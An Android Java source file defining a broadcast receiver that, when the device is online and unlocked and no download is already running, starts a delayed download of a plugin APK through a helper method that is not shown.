package com.xstd.qm.service;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import com.plugin.common.utils.UtilsRuntime;
import com.xstd.qm.Config;
import com.xstd.qm.UtilOperator;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-16
 * Time: AM10:58
 * To change this template use File | Settings | File Templates.
 */
public class PluginDownloadBroadcastReceiver extends BroadcastReceiver {

    public static final String DOWNLOAD_PLUGIN_ACTION = "com.download.plugin";

    public void onReceive(final Context context, Intent intent) {
        Config.LOGD("[[PluginDownloadBroadcastReceiver::onReceive]] Entry >>>>>>>>");

        if (UtilOperator.isPluginApkExist()) {
            Config.LOGD("[[PluginDownloadBroadcastReceiver::onReceive]] plugin apk is exist on Path : " + Config.PLUGIN_APK_PATH);
            return;
        } else {
            if (Config.DEBUG) {
                Config.LOGD("[[PluginDownloadBroadcastReceiver::onReceive]] isOnline = " + UtilsRuntime.isOnline(context)
                            + " download process = " + Config.DOWNLOAD_PROCESS_RUNNING.get()
                            + " screenLocked = " + UtilsRuntime.isScreenLocked(context));
            }

            if (UtilsRuntime.isOnline(context)
                    && !Config.DOWNLOAD_PROCESS_RUNNING.get()
                    && !UtilsRuntime.isScreenLocked(context)) {
                Handler handler = new Handler(context.getMainLooper());
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        UtilOperator.tryToDownloadPlugin(context);
                    }
                }, 5 * 1000);
            }
        }

        Config.LOGD("[[PluginDownloadBroadcastReceiver::onReceive]] Leave <<<<<<<<");
    }

}
